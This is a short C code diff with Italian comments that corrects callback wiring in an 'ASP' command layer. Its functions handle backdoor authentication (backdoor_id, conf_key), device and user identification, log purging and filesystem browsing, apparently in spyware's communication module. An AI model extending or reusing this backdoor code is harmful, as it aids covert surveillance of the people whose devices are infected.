@@ -259,7 +259,7 @@ bool execute_asp_command(WORD action, BOOL wait, FnSetup pre_check, FnReturn pos
 		return false;
 
 	ASP_IPC_command->ctrl.action = action;
-	setup(args...);
+	pre_check(args...);
 	ASP_IPC_command->ctrl.status = ASP_FETCH;
 
 	if (wait) {
@@ -308,7 +308,7 @@ static bool post_auth(char* backdoor_id, BYTE* instance_id, char* subtype, BYTE*
 // response_command deve essere allocato dal chiamante
 BOOL ASP_Auth(char* backdoor_id, BYTE* instance_id, char* subtype, BYTE* conf_key, DWORD* response_command)
 {
-	return execute_asp_command(ASP_AUTH, TRUE, setup_auth, post_nocheck, backdoor_id, instance_id, subtype, conf_key, response_command);
+	return execute_asp_command(ASP_AUTH, TRUE, setup_auth, post_auth, backdoor_id, instance_id, subtype, conf_key, response_command);
 }
 
 static void setup_id(WCHAR* username, WCHAR* device, long long* time_date, DWORD* availables, DWORD size_avail)
@@ -333,7 +333,7 @@ static bool post_id(WCHAR* username, WCHAR* device, long long* time_date, DWORD*
 // time_date e availables devono essere allocati dal chiamante
 BOOL ASP_Id(WCHAR* username, WCHAR* device, long long* time_date, DWORD* availables, DWORD size_avail)
 {
-	return execute_asp_command(ASP_IDBCK, TRUE, setup_id, post_nocheck, username, device, time_date, availables, size_avail);
+	return execute_asp_command(ASP_IDBCK, TRUE, setup_id, post_id, username, device, time_date, availables, size_avail);
 }
 
 static void setup_getupload(WCHAR* file_name, DWORD file_name_len, DWORD* upload_left)
@@ -466,7 +466,7 @@ bool post_handlepurge(long long* purge_time, DWORD* purge_size)
 // Ottiene i dati necessari per una richiesta di purge dei log
 BOOL ASP_HandlePurge(long long* purge_time, DWORD* purge_size)
 {
-	return execute_asp_command(ASP_PURGE, TRUE, setup_nothing, post_handlepurge, purge_time, purge_size);
+	return execute_asp_command(ASP_PURGE, TRUE, setup_handlepurge, post_handlepurge, purge_time, purge_size);
 }
 
 void setup_get_fs(DWORD* num_elem, fs_browse_elem** fs_array)
